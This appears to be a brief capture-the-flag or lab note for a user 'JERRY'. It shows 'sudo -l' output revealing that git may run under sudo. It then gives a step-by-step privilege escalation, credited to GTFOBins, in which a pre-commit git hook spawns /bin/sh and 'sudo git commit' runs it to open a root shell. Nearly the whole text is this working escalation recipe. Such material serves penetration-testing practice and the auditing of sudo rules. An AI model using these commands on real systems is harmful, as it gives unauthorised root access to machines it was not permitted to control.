user JERRY

$ sudo \-l

git is in sudo

TF=$\(mktemp \-d\)
git init "$TF"
echo 'exec /bin/sh 0\<\&2 1\>\&2' \>"$TF/\.git/hooks/pre\-commit\.sample"
mv "$TF/\.git/hooks/pre\-commit\.sample" "$TF/\.git/hooks/pre\-commit"
sudo git \-C "$TF" commit \-\-allow\-empty \-m x

GTFObins git